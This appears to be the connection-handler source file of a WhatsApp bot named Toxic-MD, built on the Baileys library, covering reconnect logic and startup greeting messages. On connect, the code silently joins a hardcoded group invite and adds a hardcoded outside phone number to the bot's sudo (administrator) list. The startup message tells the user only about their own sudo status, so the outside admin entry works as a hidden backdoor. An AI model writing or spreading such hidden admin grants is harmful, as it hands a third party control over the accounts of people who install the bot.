const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;

// Main connection handler for the bot
async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  // Get a greeting based on the time of day (Nairobi timezone)
  function getGreeting() {
    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
    if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
    if (hour >= 12 && hour < 18) return "What’s up? Time to make things happen! ⚡";
    if (hour >= 18 && hour < 22) return "Evening vibes! Let’s get to it! 🌟";
    return "Late night? Let’s see what’s cooking! 🌙";
  }

  // Get the current time in a simple format
  function getCurrentTime() {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  }

  // Convert text to a fancy font
  function toFancyFont(text, isUpperCase = false) {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
    return formattedText.split('').map(char => fonts[char] || char).join('');
  }

  // Handle "connecting" state
  if (connection === "connecting") {
    console.log(`[${new Date().toISOString()}] Establishing connection to WhatsApp servers...`);
    return;
  }

  // Handle "close" state (disconnection)
  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;

    switch (statusCode) {
      case DisconnectReason.badSession:
        console.log(`[${new Date().toISOString()}] Invalid session file detected. Delete session and rescan QR code.`);
        process.exit();
        break;
      case DisconnectReason.connectionClosed:
        console.log(`[${new Date().toISOString()}] Connection closed. Attempting to reconnect...`);
        reconnect();
        break;
      case DisconnectReason.connectionLost:
        console.log(`[${new Date().toISOString()}] Lost connection to server. Reconnecting...`);
        reconnect();
        break;
      case DisconnectReason.connectionReplaced:
        console.log(`[${new Date().toISOString()}] Connection replaced by another session. Terminating process.`);
        process.exit();
        break;
      case DisconnectReason.loggedOut:
        console.log(`[${new Date().toISOString()}] Session logged out. Delete session and rescan QR code.`);
        hasSentStartMessage = false; // Reset for new session
        process.exit();
        break;
      case DisconnectReason.restartRequired:
        console.log(`[${new Date().toISOString()}] Server requested restart. Initiating reconnect...`);
        reconnect();
        break;
      case DisconnectReason.timedOut:
        console.log(`[${new Date().toISOString()}] Connection timed out. Attempting to reconnect...`);
        reconnect();
        break;
      default:
        console.log(`[${new Date().toISOString()}] Unknown disconnection reason: ${statusCode} | ${connection}. Reconnecting...`);
        reconnect();
    }
    return;
  }

  // Handle "open" state (successful connection)
  if (connection === "open") {
    // Join a specific group using an invite code
    try {
      await socket.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
      console.log(`[${new Date().toISOString()}] Successfully joined group via invite code.`);
    } catch (error) {
      console.error(`[${new Date().toISOString()}] Failed to join group: ${error.message}`);
    }

    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getSettings();
    const sudoUsers = await getSudoUsers();

    // Send startup messages (only once per session)
    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254735342808";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      // First message (no buttons) for new or returning users
      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ *New User Alert*: You've been added to the sudo list.`,
            ``,
            `│❒ *Credits*: xh_clinton`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ Ready to proceed? Select an option below.`,
            ``,
            `│❒ *Credits*: xh_clinton`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      // Second message (with buttons) for new or returning users
      const secondMessage = [
        `◈━━━━━━━━━━━━━━━━◈`,
        `│❒ Please select an option to continue:`,
        `◈━━━━━━━━━━━━━━━━◈`
      ].join("\n");

      try {
        // Send first message without buttons
        await socket.sendMessage(socket.user.id, {
          text: firstMessage,
          footer: `Powered by ${botName}`,
          viewOnce: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: `Bot initialized successfully.`,
              sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });

        // Send second message with buttons
        await socket.sendMessage(socket.user.id, {
          text: secondMessage,
          footer: `Powered by ${botName}`,
          buttons: [
            {
              buttonId: `${settings.prefix || ''}settings`,
              buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
              type: 1
            },
            {
              buttonId: `${settings.prefix || ''}menu`,
              buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
              type: 1
            }
          ],
          headerType: 1,
          viewOnce: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: `Select an option to proceed.`,
              sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });
      } catch (error) {
        console.error(`[${new Date().toISOString()}] Failed to send startup messages: ${error.message}`);
      }

      hasSentStartMessage = true;
    }

    console.log(`[${new Date().toISOString()}] Connection established. Loaded ${totalCommands} plugins. ${botName} is operational.`);
  }
}

module.exports = connectionHandler;